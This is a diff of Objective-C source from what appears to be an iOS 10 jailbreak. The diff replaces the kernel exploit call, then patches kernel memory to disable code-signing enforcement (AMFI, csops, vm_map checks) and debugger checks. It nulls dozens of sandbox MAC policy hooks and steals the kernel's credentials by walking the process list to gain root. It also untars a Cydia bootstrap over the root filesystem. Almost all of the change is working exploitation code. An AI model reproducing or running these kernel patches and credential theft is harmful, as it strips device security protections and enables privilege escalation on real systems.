@@ -21,10 +21,11 @@
 #include <dlfcn.h>
 #include <spawn.h>
 
-#import "patchfinder10.h"
+#import "pf10.h"
 #import "patchfinder.h"
+#import "mac_policy.h"
 #import "lzssdec.h"
-#import "v0rtex.h"
+#import "exploit.h"
 #import "common.h"
 #import "sbops.h"
 #import "log.h"
@@ -1176,7 +1177,7 @@ bool extract_bootstrap10(void) {
 	progress_ui("getting bundle paths");
 	char* tar_path = bundle_path("tar");
 	char* launchctl_path = bundle_path("launchctl");
-	char* cydia_path = bundle_path("Cydia-9.0r4-Raw.tar");
+	char* cydia_path = bundle_path("Cydia-10.tar");
 	
 	chmod(tar_path, 0777);
 	
@@ -1185,7 +1186,7 @@ bool extract_bootstrap10(void) {
 	 */
 	progress_ui("extracting, this might take a while");
 	chmod(tar_path, 0777);
-	char* argv_[] = {tar_path, "-xf", cydia_path, "-C", "/", "--preserve-permissions", NULL};
+	char* argv_[] = {tar_path, "-xf", cydia_path, "-C", "/", "--preserve-permissions", "--overwrite", NULL};
 	easy_spawn(tar_path, argv_);
 	
 	/*
@@ -1326,6 +1327,7 @@ bool patch_kernel10(uint8_t* buf, uint32_t len) {
 	char* version_string = (char*)[[[UIDevice currentDevice] systemVersion]
 										  UTF8String];
 	
+#if 0
 	offsets->mount_common = find_mount_common10(0x80001000, buf, len, version_string);
 	offsets->mapForIO = find_mapForIO10(0x80001000, buf, len, version_string);
 	offsets->PE_i_can_has_debugger_offset = find_PE_i_can_has_debugger_offset10(0x80001000, buf, len, version_string);
@@ -1334,7 +1336,7 @@ bool patch_kernel10(uint8_t* buf, uint32_t len) {
 	uint32_t fuck = find_fuck(0x80001000, buf, len, version_string);
 	uint32_t bxlr_gadget = find_bxlr_gadget(0x80001000, buf, len, version_string);
 	uint32_t amfi_memcmp = find_amfi_memcmp(0x80001000, buf, len, version_string);
-	offsets->sbops = find_sbops(0x80001000, buf, len, version_string);
+	offsets->sbops = find_sbops10(0x80001000, buf, len, version_string);
 	
 	lprintf("mount_common = 0x%08x", offsets->mount_common);
 	lprintf("mapForIO = 0x%08x", offsets->mapForIO);
@@ -1354,45 +1356,195 @@ bool patch_kernel10(uint8_t* buf, uint32_t len) {
 	kwrite_uint8(kernel_base + tfp + 0x1, 0xbf);
 	kwrite_uint32(kernel_base + fuck, kernel_base + offsets->mapForIO);
 	kwrite_uint32(kernel_base + amfi_memcmp, kernel_base + bxlr_gadget);
+#endif
+	
+	/*
+	 *  cc @dora2iOS
+	 */
+	uint32_t proc_enforce = find_10_proc_enforce(0x80001000, buf, len);
+	uint32_t ret1_gadget = find_10_mov_r0_1_bx_lr(0x80001000, buf, len);
+	uint32_t pid_check = find_10_pid_check(0x80001000, buf, len);
+	uint32_t locked_task = find_10_convert_port_to_locked_task(0x80001000, buf, len);
+	uint32_t i_can_has_debugger_1 = find_10_i_can_has_debugger_1_103(0x80001000, buf, len);
+	uint32_t i_can_has_debugger_2 = find_10_i_can_has_debugger_2_103(0x80001000, buf, len);
+	uint32_t mount_patch = find_10_mount_103(0x80001000, buf, len);
+	uint32_t vm_map_enter = find_10_vm_map_enter_103(0x80001000, buf, len);
+	uint32_t vm_map_protect = find_10_vm_map_protect_103(0x80001000, buf, len);
+	uint32_t vm_fault_enter = find_10_vm_fault_enter_103(0x80001000, buf, len);
+	uint32_t csops_patch = find_10_csops_103(0x80001000, buf, len);
+	uint32_t amfi_ret = find_10_amfi_execve_ret(0x80001000, buf, len);
+	uint32_t amfi_cred_label_update_execve = find_10_amfi_cred_label_update_execve(0x80001000, buf, len);
+	uint32_t amfi_vnode_check_signature = find_10_amfi_vnode_check_signature(0x80001000, buf, len);
+	uint32_t amfi_loadEntitlementsFromVnode = find_10_amfi_loadEntitlementsFromVnode(0x80001000, buf, len);
+	uint32_t amfi_vnode_check_exec = find_10_amfi_vnode_check_exec(0x80001000, buf, len);
+	uint32_t mapForIO = find_10_mapForIO_103(0x80001000, buf, len);
+	uint32_t sbcall_debugger = find_10_sandbox_call_i_can_has_debugger_103(0x80001000, buf, len);
+	uint32_t vfsContextCurrent = find_10_vfs_context_current(0x80001000, buf, len);
+	uint32_t vnodeGetattr = find_10_vnode_getattr(0x80001000, buf, len);
+	uint32_t _allproc = find_10_allproc(0x80001000, buf, len);
+	uint32_t kernel_pmap = find_10_kernel_pmap(0x80001000, buf, len);
+	uint32_t kernelConfig_stub = find_10_lwvm_i_can_has_krnl_conf_stub(0x80001000, buf, len);
+	offsets->sbops = find_10_sbops(0x80001000, buf, len);
+	uint32_t bxlr_gadget = find_bxlr_gadget(0x80001000, buf, len, version_string);
+	uint32_t amfi_memcmp = find_amfi_memcmp(0x80001000, buf, len, version_string);
+	
+	kwrite_uint32(kernel_base + proc_enforce, 0x0);
+	kwrite_uint32(kernel_base + i_can_has_debugger_1, 0x1);
+	kwrite_uint32(kernel_base + i_can_has_debugger_2, 0x1);
+	kwrite_uint32(kernel_base + vm_fault_enter, 0x0b01f04f);
+	kwrite_uint32(kernel_base + vm_map_enter, 0xbf00bf00);
+	kwrite_uint32(kernel_base + vm_map_protect, 0xbf00bf00);
+	kwrite_uint32(kernel_base + csops_patch, 0xbf00bf00);
+	kwrite_uint8(kernel_base + csops_patch + 0x4, 0x00);
+	kwrite_uint8(kernel_base + csops_patch + 0x5, 0xbf);
+	kwrite_uint8(kernel_base + mount_patch + 0x7, 0xe0);
+	kwrite_uint32(kernel_base + mapForIO, 0xbf002000);
+	kwrite_uint32(kernel_base + mapForIO + 0x4, 0xbf00bf00);
+	kwrite_uint32(kernel_base + sbcall_debugger, 0xbf00bf00);
+	kwrite_uint32(kernel_base + amfi_memcmp, kernel_base + bxlr_gadget);
+	kwrite_uint8(kernel_base + pid_check, 0x00);
+	kwrite_uint8(kernel_base + pid_check + 0x1, 0xbf);
+//	kwrite_uint8(kernel_base + locked_task, 0x00);
+	kwrite_uint8(kernel_base + locked_task + 0x1, 0xe0);
+	kwrite_uint32(kernel_base + kernelConfig_stub, kernel_base + ret1_gadget);
 	
 	/*
 	 *  fuck the sandbox
 	 */
 	lprintf("nuking sandbox @ 0x%08x", kernel_base + offsets->sbops);
-	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_rename), 0);
-	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_access), 0);
-	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_chroot), 0);
-	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_create), 0);
-	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_file_check_mmap), 0);
-	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_deleteextattr), 0);
-	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_exchangedata), 0);
-	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_exec), 0);
-	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_getattrlist), 0);
-	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_getextattr), 0);
-	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_ioctl), 0);
-	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_link), 0);
-	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_listextattr), 0);
-	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_open), 0);
-	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_readlink), 0);
-	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_setattrlist), 0);
-	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_setextattr), 0);
-	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_setflags), 0);
-	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_setmode), 0);
-	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_setowner), 0);
-	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes), 0);
-	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes), 0);
-	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_stat), 0);
-	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_truncate), 0);
-	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_unlink), 0);
-	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_notify_create), 0);
-	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_fsgetpath), 0);
-	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_getattr), 0);
-	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_mount_check_stat), 0);
-	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_proc_check_fork), 0);
-	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_iokit_check_get_property), 0);
-	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_cred_label_update_execve), 0);
+	
+	uint32_t sbops = kernel_base + offsets->sbops;
+	
+	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_mount_check_mount), 0);
+	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_mount_check_remount), 0);
+	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_mount_check_umount), 0);
+	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_write), 0);
+	
+	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_file_check_mmap), 0);
+	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_rename), 0);
+	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_access), 0);
+	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_chroot), 0);
+	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_create), 0);
+	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_deleteextattr), 0);
+	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_exchangedata), 0);
+	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_exec), 0);
+	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getattrlist), 0);
+	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getextattr), 0);
+	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_ioctl), 0);
+	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_link), 0);
+	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_listextattr), 0);
+	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_open), 0);
+	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_readlink), 0);
+	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setattrlist), 0);
+	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setextattr), 0);
+	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setflags), 0);
+	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setmode), 0);
+	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setowner), 0);
+	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes), 0);
+	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_stat), 0);
+	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_truncate), 0);
+	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_unlink), 0);
+	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_notify_create), 0);
+	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_fsgetpath), 0);
+	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getattr), 0);
+	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_mount_check_stat), 0);
+	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_proc_check_setauid), 0);
+	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_proc_check_getauid), 0);
+
+	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_proc_check_fork), 0);
+	
+	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_proc_check_get_cs_info), 0);
+	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_proc_check_set_cs_info), 0);
+	
+	/*
+	 *  this code traverses a linked list in kernel memory to find the processes.
+	 *  cleaned up
+	 *
+	 *  struct proc {
+	 * 	 LIST_ENTRY(proc) p_list;	// List of all processes.		//
+	 *
+	 * 	 pid_t	   p_pid;		  // Process identifier. (static)	//
+	 * 	 void *	  task;		   // corresponding task (static)		//
+	 * 	 ...
+	 *  };
+	 *
+	 *  #define LIST_ENTRY(type)											\
+	 *  struct {															\
+	 * 	 struct type *le_next;		// next element						//  \
+	 * 	 struct type **le_prev;		// address of previous next element //  \
+	 *  }
+	 *
+	 *  sizeof(uintptr_t) on 32-bit = 4
+	 *  2 pointers = 2 * 4 = 8
+	 *  offset of p_pid = 8
+	 *  the next proc entry is the first pointer in the LIST_ENTRY struct, which is conveniently
+	 *  the first element in the proc struct.
+	 *  therefore, offset of the next proc entry is 0
+	 *
+	 *  loop through the linked list by getting allproc
+	 *  check the pid, and compare it to ours or the kernels
+	 *  save it if it's either, otherwise continue
+	 *
+	 *  eventually at the end we have the addresses of the kernel's proc struct and ours.
+	 *  now we do writing magic to get kernel privs :P
+	 */
+	
+	/*
+	 *  get kernel credentials so we can get our friend, uid=0.
+	 */
+	lprintf("stealing kernel creds");
+	uint32_t allproc_read	= kread_uint32(kernel_base + _allproc);
+	lprintf("uint32_t allproc = 0x%08x, uint32_t allproc_read = 0x%08x;",
+			kernel_base + _allproc,
+			allproc_read);
+	pid_t our_pid		= getpid();
+	lprintf("our_pid = %d", our_pid);
+	
+	myproc				= 0;
+	uint32_t kernproc	= 0;
+	
+	if (allproc_read != 0) {
+		while (myproc == 0 || kernproc == 0) {
+			uint32_t kpid = kread_uint32(allproc_read + 8);
+			if (kpid == our_pid) {
+				myproc = allproc_read;
+				lprintf("found myproc 0x%08x, %d", myproc, kpid);
+			} else if (kpid == 0) {
+				kernproc = allproc_read;
+				lprintf("found kernproc 0x%08x, %d", kernproc, kpid);
+			}
+			allproc_read = kread_uint32(allproc_read);
+		}
+	} else {
+		/* fail */
+		return false;
+	}
+	
+	/*
+	 *  TODO: don't hardcode 0xa4, ideally write patchfinder code for it
+	 */
+	
+	uint32_t kern_ucred = kread_uint32(kernproc + 0x98);
+	lprintf("uint32_t kern_ucred = 0x%08x;", kern_ucred);
+	
+	ourcred = kread_uint32(myproc + 0x98);
+	lprintf("uint32_t ourcred = 0x%08x;", ourcred);
+
+	/*
+	 *  i am (g)root
+	 */
+	kwrite_uint32(myproc + 0x98, kern_ucred);
+	setuid(0);
+	
+	
 	
 	return true;
+}
+
+char* my_strcat(char* s1, char* s2) {
+	char* s3 = NULL;
+	asprintf(&s3, "%s%s", s1, s2);
+	return s3;
 }
 
 bool jailbreak10(void) {
@@ -1403,7 +1555,8 @@ bool jailbreak10(void) {
 	NSArray *paths;
 	size_t sz;
 	
-	tfp0 = v0rtex_me_harder();
+//	tfp0 = v0rtex_me_harder();
+	tfp0 = sock_port_me_harder();
 	lprintf("tfp0=0x%x", tfp0);
 	
 	progress_ui("patching pmap");
@@ -1459,9 +1612,11 @@ bool jailbreak10(void) {
 	documentsDirectory = [paths firstObject];
 	doc_dir = (char*)[documentsDirectory UTF8String];
 	
-	FILE* fp2 = fopen(strcat(doc_dir, "/lzssed.bin"), "wb");
+	/*
+	FILE* fp2 = fopen(my_strcat(doc_dir, "/lzssed.bin"), "wb");
 	fwrite(whatever, 1, sz * 2, fp2);
 	fclose(fp2);
+	 */
 	
 	darwin_kernel = (char*)memmem(whatever, sz * 2, "Darwin", strlen("Darwin"));
 	
